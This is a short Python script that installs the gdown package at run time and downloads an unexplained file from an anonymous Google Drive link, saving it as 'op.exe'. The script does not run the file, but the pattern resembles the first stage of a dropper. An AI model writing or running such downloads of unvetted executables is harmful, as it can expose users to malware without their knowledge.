import subprocess, sys

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'gdown'])

import gdown

url = "https://drive.google.com/u/0/uc?id=1UAAsr0nMx0aEqFV9r5DedFa3h_cdjnoj&export=download"
output = "op.exe"

gdown.download(url, output)